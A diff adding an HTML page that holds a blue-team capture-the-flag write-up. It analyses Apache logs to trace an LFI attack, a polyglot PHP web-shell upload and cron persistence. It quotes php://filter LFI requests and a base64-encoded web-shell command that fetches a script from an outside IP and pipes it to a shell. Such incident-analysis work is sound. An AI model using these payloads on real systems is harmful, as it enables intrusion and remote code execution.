@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mission 2 - SOC Analysis</title>
+
+  <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon" />
+  <link rel="stylesheet" href="../css/main.css" />
+  <link rel="stylesheet" href="../css/media.css" />
+  <link rel="stylesheet" href="../css/writeups.css" />
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css" crossorigin="anonymous" />
+
+  <script defer src="../js/writeups.js"></script>
+</head>
+
+<body class="left-aligned-hero">
+
+  <div id="nav-placeholder"></div>
+
+  <div id="content" class="fade-in">
+
+    <section id="home" class="hero">
+      <div class="container container-lg">
+        <a href="../writeups.html" class="back-arrow" data-aos="fade-right" data-aos-duration="1000">← Back to Writeups</a>
+
+        <div class="hero-content">
+          <div class="hero-image" data-aos="fade-up" data-aos-duration="1000">
+            <img src="/img/writeups/mission2/mission2.png" alt="Mission 2 - SOC Analysis" />
+          </div>
+          <h1 class="hero-heading" data-aos="fade-up" data-aos-duration="1200">Mission 2 - SOC Analysis</h1>
+          <p class="writeup-meta" data-aos="fade-up" data-aos-duration="1400">
+            <strong>Category:</strong> Blue Teaming | 
+            <strong>Difficulty:</strong> Medium | 
+            <strong>Date:</strong> 2025-04-24
+          </p>
+          <p class="writeup-summary" data-aos="fade-up" data-aos-duration="1600">
+            Investigation into a compromise event targeting Nuclear Punk via Apache and system logs, culminating in identifying attacker techniques, IP, and persistence mechanisms.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <section id="writeup-content" class="writeup-content">
+      <div class="container">
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Initial Investigation</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          We began by analyzing Apache logs from host <strong>Apache-3c5ea5a9</strong>. 
+          <br>
+          Three distinct peaks of activity were observed at <code>00:14</code>, <code>00:19</code>, and <code>00:35</code>. <br>
+          The 00:19 spike presented the most promising lead.
+        </p>
+        <img src="/img/writeups/mission2/mission2-1.png" alt="Log Peak Overview" width="800" data-aos="fade-right" data-aos-duration="1000">
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Identifying Attacker IP</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          At the 00:19 spike, we observed around 6,000 requests, 85% of which came from <code>10.143.17.101</code>. Among these, only 50 received a <code>200 OK</code> response. Unusual payloads and fuzzing behavior led us to deeper inspection.
+        </p>
+        <img src="/img/writeups/mission2/mission2-2.png" alt="Suspicious Request Patterns" width="800" data-aos="fade-right" data-aos-duration="1000">
+
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>
+            GET /?lang=php://filter/read=convert.base64-encode&page=resource=index HTTP/1.1 <br>
+            Host: victim<br>
+            User-Agent: fuzztool/v1
+          </code>
+        </pre>
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Vulnerability Chain</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          The attacker first exploited a <strong>Local File Inclusion (CWE-98)</strong> to read sensitive application files, such as <code>index.php</code> and <code>config.php</code>. This allowed eventual authentication to the admin portal.
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>
+            /lang=php://filter/read=convert.base64-encode&page=resource=config<br>
+            /admin-page/manage.php
+          </code>
+        </pre>
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">File Upload & Webshell Access</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          Once authenticated, the attacker abused a file upload function to place a polyglot PHP shell named <code>ev1L.php.png</code>. The server was tricked into executing the file via another LFI request. This corresponds to <strong>CWE-434</strong>.
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>
+            GET /uploads/ev1L.php.png?cmd=<br>echo+ZWNobyAid2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvc3FsaTJiLnNoIHwgYmFzaCIKfCBiYXNlNjQgLWR8c2g=<br> | base64 -d|sh
+          </code>
+        </pre>
+
+        <img src="/img/writeups/mission2/mission2-3.png" alt="CyberChef - Decode Base64 Command" width="800" data-aos="fade-right" data-aos-duration="1000">
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Malware & Persistence</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          After obtaining remote shell access, the attacker downloaded a reverse shell script from their server <code>http://163.172.67.201:49999</code>. They placed it in:
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>
+/root/.0x00/pwn3d-by-nullv4stati0n.sh
+          </code>
+        </pre>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          Persistence was achieved by adding this script to the root user's cron schedule.
+        </p>
+
+        <h2 class="section-title" data-aos="fade-right" data-aos-duration="1000">Conclusion</h2>
+        <p data-aos="fade-right" data-aos-duration="1200">
+          Through a combination of <strong>CWE-98 (LFI)</strong> and <strong>CWE-434 (File Upload)</strong>, the attacker gained persistent root access. Final flag recovered:
+        </p>
+        <pre class="code-block" data-aos="fade-up" data-aos-duration="1200">
+          <code>
+RM{CWE-98:CWE-434:163.172.67.201:/root/.0x00/pwn3d-by-nullv4stati0n.sh}
+          </code>
+        </pre>
+
+      </div>
+    </section>
+  </div>
+
+  <div id="footer-placeholder"></div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+  <script src="../js/components.js"></script>
+  <script type="module" src="../js/main.js"></script>
+
+  <script>
+    AOS.init({ duration: 1000, easing: 'ease-in-out', once: true });
+    document.addEventListener("DOMContentLoaded", () => {
+      document.getElementById("content").classList.add("fade-in-active");
+    });
+  </script>
+</body>
+</html>
